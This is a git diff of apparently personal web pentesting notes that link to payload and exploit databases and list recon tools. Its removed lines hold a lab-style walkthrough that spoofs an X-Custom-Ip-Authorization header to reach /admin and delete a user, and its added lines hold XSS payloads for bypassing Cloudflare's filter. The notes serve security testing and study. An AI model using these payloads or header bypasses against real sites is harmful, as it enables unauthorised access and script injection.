@@ -1,33 +1,5 @@
-<img src="https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true" width="600">
-
-* [SQL Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/SQL%20Injection/)
-* [Server Side Request Forgery](https://github.com/Anvesh464/Web_APP_Test/tree/main/Server%20Side%20Request%20Forgery/)
-* [Server Side Template Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/Server%20Side%20Template%20Injection/)
-* [Upload Insecure Files](https://github.com/Anvesh464/Web_APP_Test/tree/main/Upload%20Insecure%20Files/)
-* [Web Cache Deception](https://github.com/Anvesh464/Web_APP_Test/tree/main/Web%20Cache%20Deception/)
-* [Web Sockets](https://github.com/Anvesh464/Web_APP_Test/tree/main/Web%20Sockets/)
-* [XSLT Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XSLT%20Injection/)
-* [XXE Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XXE%20Injection/)
-* [XSS Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XSS%20Injection/)
-  
-Make life easier, not harder.
 [PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)
-
-### Application version-related exploits
 Search in [exploit-db](https://www.exploit-db.com/)
-
-## Addons 
-
-- Hackbar, CounterXSS, FindSomething, XSS辅助工具, XSS, Hack-Tools, WhatCMS, 
-- FoxyProxy Standard
-- Wappalyzer
-- Cookies Manager+
-- SQL Inject Me
-- XSS Me
-- Tamper Data
-- SecurityFocus Vulnerabilities search plugin
-- Packet Storm search plugin
-- Offsec Exploit-db Search
 
 ## Vulnerability Categories
 
@@ -52,12 +24,6 @@ Search in [exploit-db](https://www.exploit-db.com/)
 ## cURL to Burp Request Command
 curl -x 127.0.0.1:8080
 
-## XSS Payload Example
-```html
-%3cscript%3ealert%281%29%3c%2fscript%3e
-```
-# Enumeration
-
 ## 1. Information Gathering
 
 - has to know the terminology and gather information about the version, Server, Frameworks, and Default credentials.
@@ -77,6 +43,7 @@ curl -x 127.0.0.1:8080
 5. Which programming language they are using
 6. Open ports and services
 7. Site:eur.nl responsible disclosure
+8. sort out subdomain unpapularity (Less travel rout
 
 ### Tools for Finding Subdomains
 
@@ -89,8 +56,6 @@ curl -x 127.0.0.1:8080
 - [Netcraft](https://searchdns.netcraft.com/)
 - [HTTP Status Checker](https://httpstatus.io/)
 - [SubFinder](https://github.com/projectdiscovery/subfinder)
-
-sort out subdomain unpapularity (Less travel route)
 
 ### Finding IP Address & Open Ports
 
@@ -107,37 +72,6 @@ nc head / http/1.0
 telnet
 waplayzer
 ```
-## Information disclosure
-
-GET /product?productId=aaa
-We find the debug page in “/cgi-bin/phpinfo.php”:
-
-![image](https://github.com/user-attachments/assets/7028eb48-100c-4f87-a0d6-1efeb49c46a5)
-
-We can find the secret key ("8f4xrr692ckcxycofkaupwwu37cse6io") in the “Environment” section:
-![image](https://github.com/user-attachments/assets/17a0365b-bd9f-40f5-9658-c7552440bdd4)
-There is a /robots.txt file:
-forcefully generating an error messages 
-check .js file for disclosure credentials
-The directory .git/ exists and allows directory listing:
-
-After logging in, send a request with the TRACE HTTP method, which reveals the header “X-Custom-IP-Authorization”:
-![image](https://github.com/user-attachments/assets/a2d7fc98-b0a8-4520-aba9-48f6645213ef)
-It is possible to access /admin with:
-```
-GET /admin HTTP/2
-...
-X-Custom-Ip-Authorization: 127.0.0.1
-```
-![image](https://github.com/user-attachments/assets/6adc9f6e-9d48-4529-9d5b-5e2138f31296)
-And then delete the user with:
-```
-GET /admin/delete?username=carlos HTTP/2
-...
-X-Custom-Ip-Authorization: 127.0.0.1
-```
-![image](https://github.com/user-attachments/assets/409feb4b-ed8d-45dd-9348-625d13a5cc0d)
-
 ---
 ## API Key and Token Leaks
 
@@ -304,6 +238,7 @@ Common examples of Business Logic Errors.
 ```
 ### Cloudflare XSS Bypasses
 ```html
+%3cscript%3ealert%281%29%3c%2fscript%3e
 <svg/OnLoad="`${prompt``}`">
 <svg/onload=%26nbsp;alert`bohdan`+
 1'"><img/src/onerror=.1|alert``>
